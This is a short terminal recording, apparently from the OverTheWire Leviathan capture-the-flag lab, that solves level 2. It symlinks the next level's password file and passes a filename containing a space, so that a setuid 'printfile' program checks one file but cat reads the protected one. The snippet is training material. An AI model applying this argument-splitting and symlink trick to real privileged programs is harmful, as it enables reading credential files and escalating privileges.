[0.001, "o", "$ trick: access() checks \"/tmp/l2/a b\" (a real file we can access) but /bin/cat splits on the space\r\r\n$   -> symlink /tmp/l2/a -> /etc/leviathan_pass/leviathan3, then create a real file \"/tmp/l2/a b\"\r\r\n$ ssh leviathan2@leviathan.labs.overthewire.org -p 2223 rm -rf /tmp/l2; mkdir -p /tmp/l2; ln -s /etc/leviathan_pass/leviathan3 /tmp/l2/a; touch \"/tmp/l2/a b\"; ls -la /tmp/l2; ./printfile \"/tmp/l2/a b\"\r\r\n"]
